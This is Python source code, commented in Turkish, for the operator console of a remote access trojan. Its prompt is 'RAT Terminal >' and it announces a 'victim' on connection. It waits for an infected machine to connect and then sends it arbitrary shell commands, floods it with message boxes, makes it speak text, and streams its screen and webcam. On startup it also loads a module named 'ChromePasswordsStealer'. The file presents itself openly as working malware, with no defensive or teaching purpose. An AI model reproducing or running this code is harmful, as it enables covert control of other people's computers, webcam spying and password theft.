import RatModule

from dataclasses import dataclass
import socket
import os
import cmd
import platform
import time
import vidstream


## Global fonksiyonlar örneği için değişken ##
global fonksiyonlar


class Server_Modulu:
    @dataclass
    class client_data:
        _client: socket.socket
        _client_addr: tuple
        _clientvid: vidstream.StreamingServer
        _clientcam: vidstream.StreamingServer

    def __init__(self, ip: str, port: int, auto_ip: bool | None = True) -> None:
        if auto_ip:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
        else:
            local_ip = ip

        fonksiyonlar.PC_INFO.port = port
        fonksiyonlar.PC_INFO.ip_adresi = local_ip

        self.socket = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
        )
        self.socket.setsockopt(
            socket.SOL_SOCKET,
            socket.SO_REUSEADDR, 1
        )
        self.client_data: Server_Modulu.client_data | None = None

    def Listen_and_Accept(self) -> None:
        address = (fonksiyonlar.PC_INFO.ip_adresi, fonksiyonlar.PC_INFO.port)
        self.socket.bind(address)
        self.socket.listen(1)
        client, addr = self.socket.accept()
        self.client_data = Server_Modulu.client_data(
            _client=client, _client_addr=addr, _clientvid = None,
            _clientcam = None
        )

    def Release(self) -> None:
        if self.client_data and self.client_data._client:
            try:
                self.client_data._clientvid.stop_server()
                self.client_data._clientcam.stop_server()
                self.client_data._client.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass  # Zaten kapalı olabilir
            self.client_data._client.close()
            self.client_data = None
        try:
            self.socket.close()
        except Exception:
            pass


class KomutSatiri(cmd.Cmd):
    baglanabilirlik = False
    _server: Server_Modulu | None = None

    prompt = "RAT Terminal > "

    def do_temizle(self, arg) -> None:
        fonksiyonlar.temizle()

    def do_soket_olustur(self, arg: str) -> None:
        input_list = arg.split()

        if len(input_list) != 2:
            print("*** Geçersiz Komut")
            return

        ip, port_str = input_list[0], input_list[1]

        try:
            port = int(port_str)
        except ValueError:
            print("*** Geçersiz port numarası")
            return

        self._server = Server_Modulu(ip=ip, port=port, auto_ip=False)
        print(f"[*] {ip}:{port} üzerinde dinleniyor, bağlantı bekleniyor...")
        self._server.Listen_and_Accept()
        self.baglanabilirlik = True
        print(f"[*] Kurban bağlandı : {self._server.client_data._client_addr[0]}-{self._server.client_data._client_addr[1]}")

    def do_messagebox(self, arg: str) -> None:
        if not self.baglanabilirlik or not self._server or not self._server.client_data:
            print("[-] Bağlantı aktif değil")
            return
        

        baslik = input("Messagebox Başlığı > ")
        metin = input("Messagebox Metini > ")
        icon = input("Messagebox ikonu (sayi gir 0-64) > ")
        yollanma_sayisi = input("Aynı mesaj kaç tane yollansın?: ")

        if len(baslik) == 0 or len(metin) == 0 or len(icon) == 0 or len(yollanma_sayisi) == 0:
            print("[-] Girdilerde bir hata var")
            return
        
        try:
            icon = int(icon)
            yollanma_sayisi = int(yollanma_sayisi)
            if icon < 0 or icon > 64 or yollanma_sayisi <= -1:
                print("[-] Girdilerde bir hata var")
                return
        except ValueError:
            print("[-] Girdilerde bir hata var")
            return

        try:
            gorev = "messagebox".encode("utf-8")
            self._server.client_data._client.sendall(gorev)
            time.sleep(0.1)
            
            self._server.client_data._client.sendall(baslik.encode("utf-8"))
            time.sleep(0.1)
            self._server.client_data._client.sendall(metin.encode("utf-8"))
            time.sleep(0.1)
            self._server.client_data._client.sendall(str(icon).encode("utf-8"))
            time.sleep(0.1)
            self._server.client_data._client.sendall(str(yollanma_sayisi).encode("utf-8"))
            time.sleep(0.1)
        except Exception as e:
            print(f"[-] Veri gönderilirken hata: {e}")
    
    def do_komut_satiri(self, arg: str) -> None:
        if not self.baglanabilirlik or not self._server or not self._server.client_data:
            print("[-] Bağlantı aktif değil")
            return
        
        if len(arg.split()) < 1:
            print("*** Geçersiz Komut")
            return
        
        try:
            gorev = "komut_satiri".encode("utf-8")
            self._server.client_data._client.sendall(gorev)
            time.sleep(0.1)
            yollanacak = arg.encode("utf-8")
            self._server.client_data._client.sendall(yollanacak)
        except Exception as e:
            print(f"[-] Veri gönderilirken hata: {e}")
    
    def do_konustur(self, arg) -> None:
        if not self.baglanabilirlik or not self._server or not self._server.client_data:
            print("[-] Bağlantı aktif değil")
            return
        
        if len(arg.split()) < 1:
            print("*** Geçersiz Komut")
            return
        
        try:
            gorev = "konustur".encode("utf-8")
            self._server.client_data._client.sendall(gorev)
            time.sleep(0.1)
            yollanacak = arg.encode("utf-8")
            self._server.client_data._client.sendall(yollanacak)
        except Exception as e:
            print(f"[-] Veri gönderilirken hata: {e}")

    def do_soket_kapat(self, arg) -> None:
        if self.baglanabilirlik and self._server:
            self._server.Release()
            self.baglanabilirlik = False
            print("[*] Soket bağlantısı kapatıldı.")
        else:
            print("[-] Bağlantı zaten kapalı")

    def do_exit(self, arg) -> None:
        if self.baglanabilirlik and self._server:
            self._server.Release()
        print("Çıkılıyor...")
        return True
    
    def do_izle(self, args) -> None:
        if not self.baglanabilirlik or not self._server or not self._server.client_data:
            print("[-] Bağlantı aktif değil")
            return
        
        if len(args) <= 0:
            print("*** Geçersiz komut")
            return
        
        if args == "baslat":
            self._server.client_data._client.sendall("baslat".encode("utf-8"))
            time.sleep(0.1)

            from random import randint
            uretilen_port = randint(49152, 65535)
            self._server.client_data._client.sendall(str(uretilen_port).encode("utf-8"))
            self._server.client_data._clientvid = vidstream.StreamingServer(fonksiyonlar.PC_INFO.ip_adresi, uretilen_port)
            self._server.client_data._clientcam = vidstream.StreamingServer(fonksiyonlar.PC_INFO.ip_adresi, uretilen_port + 1)
            self._server.client_data._clientvid.start_server()
            self._server.client_data._clientcam.start_server()
        
        elif args == "durdur":
            self._server.client_data._client.sendall("durdur".encode("utf-8"))
            self._server.client_data._clientvid.stop_server()
            if self._server.client_data._clientvid:
                self._server.client_data._clientvid = None
            if self._server.client_data._clientcam:
                self._server.client_data._clientcam = None
            
    def do_help(self, arg) -> None:
        if not arg:
            print(
                "\n[!] Yardım sistemine hoşgeldin!\n\n"
                "Kullanabileceğin komutlar:\n"
                "soket_olustur <ip> <port>\n"
                "messagebox\n"
                "komut_satiri <komut>\n"
                "soket_kapat (soketi kapatır)\n"
                "konustur <metin>\n"
                "temizle (terminali temizler)\n"
                "exit - Çıkış yapar (soketi kapatır)\n"
                "izle <baslat/durdur>\n"
                "help - Yardım gösterir (bu mesaj)\n"
            )

    def default(self, line) -> None:
        if line:
            print(f"*** Geçersiz Komut: {line}")
        else:
            print("*** Geçersiz Komut")


@dataclass
class PC_INFO:
    isletim_sistemi: str = ""
    ip_adresi: str = ""
    port: int = 0


class OnemliFonksiyonlar:
    def __init__(self) -> None:
        self.PC_INFO = PC_INFO()
        self.PC_INFO.isletim_sistemi = platform.system()

    def temizle(self) -> None:
        if self.PC_INFO.isletim_sistemi.lower() == "windows":
            os.system("cls")
        else:
            os.system("clear")


def main():
    KomutSatiri().cmdloop()


if __name__ == "__main__":
    try:
        ## Kütüphane kontrollerinin elden geçirilmesi ##
        Modules = RatModule.Modules_class("vidstream", "requests", "pymsgbox", "pyttsx3", "ChromePasswordsStealer")
        Modules.install_and_import_control(importing=True)
        print("""
⠀⠀⠀⠀⠀⣀⣠⠤⠶⠶⣖⡛⠛⠿⠿⠯⠭⠍⠉⣉⠛⠚⠛⠲⣄⠀⠀⠀⠀⠀
⠀⠀⢀⡴⠋⠁⠀⡉⠁⢐⣒⠒⠈⠁⠀⠀⠀⠈⠁⢂⢅⡂⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠀⣼⠀⠀⠀⠁⠀⠀⠀⠂⠀⠀⠀⠀⢀⣀⣤⣤⣄⡈⠈⠀⠀⠀⠘⣇⠀⠀⠀
⢠⡾⠡⠄⠀⠀⠾⠿⠿⣷⣦⣤⠀⠀⣾⣋⡤⠿⠿⠿⠿⠆⠠⢀⣀⡒⠼⢷⣄⠀
⣿⠊⠊⠶⠶⢦⣄⡄⠀⢀⣿⠀⠀⠀⠈⠁⠀⠀⠙⠳⠦⠶⠞⢋⣍⠉⢳⡄⠈⣧
⢹⣆⡂⢀⣿⠀⠀⡀⢴⣟⠁⠀⢀⣠⣘⢳⡖⠀⠀⣀⣠⡴⠞⠋⣽⠷⢠⠇⠀⣼
⠀⢻⡀⢸⣿⣷⢦⣄⣀⣈⣳⣆⣀⣀⣤⣭⣴⠚⠛⠉⣹⣧⡴⣾⠋⠀⠀⣘⡼⠃
⠀⢸⡇⢸⣷⣿⣤⣏⣉⣙⣏⣉⣹⣁⣀⣠⣼⣶⡾⠟⢻⣇⡼⠁⠀⠀⣰⠋⠀⠀
⠀⢸⡇⠸⣿⡿⣿⢿⡿⢿⣿⠿⠿⣿⠛⠉⠉⢧⠀⣠⡴⠋⠀⠀⠀⣠⠇⠀⠀⠀
⠀⢸⠀⠀⠹⢯⣽⣆⣷⣀⣻⣀⣀⣿⣄⣤⣴⠾⢛⡉⢄⡢⢔⣠⠞⠁⠀⠀⠀⠀
⠀⢸⠀⠀⠀⠢⣀⠀⠈⠉⠉⠉⠉⣉⣀⠠⣐⠦⠑⣊⡥⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⢸⡀⠀⠁⠂⠀⠀⠀⠀⠀⠀⠒⠈⠁⣀⡤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠶⢤⣤⣤⣤⣤⡤⠴⠖⠚⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
        time.sleep(2)

        fonksiyonlar = OnemliFonksiyonlar()
        fonksiyonlar.temizle()
        ## Ana kod bütünü burada başlıyor ##
        main()
    except KeyboardInterrupt:
        fonksiyonlar.temizle()
        print("\nKullanıcı tarafından kesildi, çıkılıyor...")
